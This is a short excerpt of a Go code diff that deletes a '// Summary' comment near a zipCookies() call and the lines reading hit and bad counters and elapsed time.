 	zipCookies()
 
-	// Summary
 	totalTime := elapsed()
 	h := atomic.LoadInt64(&statHits)
 	b := atomic.LoadInt64(&statBad)
